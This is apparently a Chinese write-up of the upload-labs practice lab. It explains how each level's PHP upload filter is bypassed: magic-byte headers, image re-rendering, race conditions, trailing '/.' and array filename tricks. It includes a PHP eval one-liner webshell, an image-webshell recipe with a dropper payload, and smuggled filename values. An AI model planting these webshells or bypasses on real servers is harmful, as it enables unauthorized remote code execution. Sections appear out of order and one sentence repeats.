alt="image-20210215145042313"></p><p><img src="image-20210215145151607.png" alt="image-20210215145151607"></p><h3 id="Pass-13：文件头检测"><a href="#Pass-13：文件头检测" class="headerlink" title="Pass-13：文件头检测"></a>Pass-13：文件头检测</h3><p>这一关开始上传图片马，后台</p><p><img src="image-20210215161722242.png" alt="image-20210215161722242"></p><p>使用了 getReailFileType函数</p><p><strong>绕过</strong></p><p>burp抓包添加一个图片文件的文件幻数</p><p><img src="image-20210215161612151.png" alt="image-20210215161612151"></p><p>或者直接上传一张图片马即可。</p><h3 id="Pass-14：getimagesize"><a href="#Pass-14：getimagesize" class="headerlink" title="Pass-14：getimagesize"></a>Pass-14：getimagesize</h3><p>查看后台源码</p><p><img src="image-20210215151630875.png" alt="image-20210215151630875"></p><p>使用了getimagesize函数来验证，加对应图片的文件头就o了</p><p>比如：gif-GIF89a</p><p><img src="image-20210215153117383.png" alt="image-20210215153117383"></p><p>或者传一个图片马子</p><h3 id="Pass-15：exif-imagetype"><a href="#Pass-15：exif-imagetype" class="headerlink" title="Pass-15：exif_imagetype()"></a>Pass-15：exif_imagetype()</h3><p>后台</p><p><img src="image-20210215153456115.png" alt="image-20210215153456115"></p><p><strong>绕过</strong></p><p>同13、14一样</p><h3 id="Pass-16：二次渲染"><a href="#Pass-16：二次渲染" class="headerlink" title="Pass-16：二次渲染"></a>Pass-16：二次渲染</h3><p>后台</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这里先是判断Content-Type，然后再用imagecreatefrom[gif|png|jpg]函数判断是否是图片格式，如果是图片的话再用image[gif|png|jpg]函数对其进行二次渲染。</p><p>这里就不再对比上传图片马前后的区别，直接结论：图片马的恶意内容被磨除了。</p><p><strong>绕过</strong></p><p>如果想要绕过二次渲染的话，就要搞清楚二次渲染后，源文件哪些区域不会被修改或压缩。这里因为gif、jpg、png三种不同图片文件的文件格式不同，所以图片马的构造方法也不同，具体可以参考我的上一篇文章中有总结：“文件上传”</p><h3 id="Pass-17：条件竞争时间差"><a href="#Pass-17：条件竞争时间差" class="headerlink" title="Pass-17：条件竞争时间差"></a>Pass-17：条件竞争时间差</h3><p>后台</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难发现，这里是先move_uploaded_file函数将上传文件临时保存，再进行判断，如果不在白名单里则unlink删除，在的话就rename重命名，所以这里存在条件竞争。</p><p><strong>绕过</strong></p><p>用burp开启两个intruder模块，一个用于重复上传，另一个用于重复访问。</p><p>1、先设置上传请求,记住此处的文件名，等下要用来拼接访问请求的url</p><p><img src="image-20210215163251176.png" alt="image-20210215163251176"></p><p>2、因为此处没有什么参数需要爆破，只是需要重复发起请求，所以payload设置为Null payloads,设置访问次数5000次，线程50个</p><p><img src="image-20210215164100568.png" alt="image-20210215164100568"></p><p>3、接下来设置访问请求<br>1、浏览器构造请求url：<code>http://127.0.0.1/upload-labs/upload/ma.Php</code>,进行访问，然后用burp抓包<br>2、burp抓包后发送至intruder模块，然后设置payload，这一步和上传请求设置差不多,都是Null payloads、5000次、50个线程</p><p>3、设置好两个模块后同时启动，观察结果，因为我们传入的php代码是<code>phpinfo();</code>,所以如果访问成功的话，会返回php的配置信息。</p><p>注意：条件竞争绕过存在一定概率，实践中如果一次不成功，可以多试几次。</p><p>另外一种方法，在上一篇文章中也讲过</p><p>也可以上传图片马</p><h3 id="Pass-18：突破上传重命名"><a href="#Pass-18：突破上传重命名" class="headerlink" title="Pass-18：突破上传重命名"></a>Pass-18：突破上传重命名</h3><p>这里先将上传的文件保存（move函数），再rename重命名一下。所以也存在条件竞争，绕过方法和上面Pass-17差不多，这里就不重复写了。这里先将上传的文件保存（move函数），再rename重命名一下。所以也存在条件竞争，绕过方法和上面Pass-17差不多，这里就不重复写了。</p><h3 id="Pass-19：-绕过"><a href="#Pass-19：-绕过" class="headerlink" title="Pass-19：.&#x2F;绕过"></a>Pass-19：.&#x2F;绕过</h3><p>后台</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这里img_path可控（通过post sava_name），所以可以利用move_uploaded_file的\x00截断(save_name&#x3D;ma.php%00.jpg)绕过,但\x00截断之前关卡已经出现过了，这里明显是考察别的知识点。于是网上找找别人的答案，发现考点是:move_uploaded_file会忽略掉文件末尾的&#x2F;.所以可以构造save_path&#x3D;ma.php&#x2F;.,这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的&#x2F;.可以实现保存文件为.php</p><p><strong>绕过</strong></p><p>burp抓包末尾添加：<code>save_name=ma.php/.</code>，注意马的名字与filename一致</p><p><img src="image-20210215173229186.png" alt="image-20210215173229186"></p><p>当然也可以传个图片马子</p><p>也可以直接在上传处保存文件名哪里后面加<code>/</code>或者<code>.</code>都可</p><h3 id="Pass-20：数组-绕过"><a href="#Pass-20：数组-绕过" class="headerlink" title="Pass-20：数组&#x2F;.绕过"></a>Pass-20：数组&#x2F;.绕过</h3><p>后台代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现<code>$file_name</code>经过<code>reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>处理。</p><p>如果上传的是数组的话，会跳过<code>$file = explode(&#39;.&#39;, strtolower($file));</code>。并且后缀有白名单过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ext = end($file);</span><br><span class="line">$allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br></pre></td></tr></table></figure><p>而最终的文件名后缀取的是<code>$file[count($file) - 1]</code>，因此我们可以让<code>$file</code>为数组。<code>$file[0]</code>为<code>smi1e.php/</code>，也就是<code>reset($file)</code>，然后再令<code>$file[2]</code>为白名单中的jpg。此时<code>end($file)</code>等于jpg，<code>$file[count($file) - 1]</code>为空。而 <code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>，也就是<code>smi1e.php/.</code>，最终<code>move_uploaded_file</code>会忽略掉<code>/.</code>，最终上传<code>smi1e.php</code>。</p><p><strong>绕过</strong></p><p>burp抓包修改为数组，如下</p><p><img src="image-20210215181210201.png" alt="image-20210215181210201"></p><p>本文是upload-labs通关记录。</p><!-- more --><h3 id="前期准备-1"><a href="#前期准备-1" class="headerlink" title="前期准备"></a>前期准备</h3><p>制作一个一句话木马：<code>&lt;?php @eval($_POST[1]);?&gt;</code></p><p>制作一个图片马：<code>copy 1.jpg/b +ma.php/a ma.jpg</code></p><p>图片马内容：<code>&lt;?php  fputs(fopen(&#39;xx.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;); ?&gt;</code></p><h3 id="Pass-01：前端js验证-1"><a href="#Pass-01：前端js验证-1" class="headerlink" title="Pass-01：前端js验证"></a>Pass-01：前端js验证</h3><p>随意选个马子传一下，结果秒显不允许</p><p><img src="image-20210215110356885.png" alt="image-20210215110356885"></p><p>猜测前端js检查了，验证前端代码</p><p><img src="image-20210215110544819.png" alt="image-20210215110544819"></p><p><strong>绕过</strong></p><p>关了浏览器的前端js验证。</p><p>当然你要是嫌关js麻烦，你传个图片马就o了</p><p>上传图片马，然后文件包含</p><p><img src="image-20210215154901813.png" alt="image-20210215154901813"></p><p>菜刀连接</p><p><img src="image-20210215154959908.png" alt="image-20210215154959908"></p><h3 id="Pass-02：MIME-1"><a href="#Pass-02：MIME-1" class="headerlink" title="Pass-02：MIME"></a>Pass-02：MIME</h3><p>老规矩，搞个马子传一下</p><p><img src="image-20210215122215429.png" alt="image-20210215122215429"></p><p>看一下后台源代码</p><p><img src="image-20210215122237531.png" alt="image-20210215122237531"></p><p><strong>绕过</strong>验证MIME类型的，抓包改一下MIME为image&#x2F;jpeg就o了</p><p>嫌抓包麻烦，直接传个图片马也可以。</p><h3 id="Pass-03：宽松的黑名单-1"><a href="#Pass-03：宽松的黑名单-1" class="headerlink" title="Pass-03：宽松的黑名单"></a>Pass-03：宽松的黑名单</h3><p><img src="image-20210215124206217.png" alt="image-20210215124206217"></p><p>一看黑名单验证，查看后台源码</p><p><img src="image-20210215124326909.png" 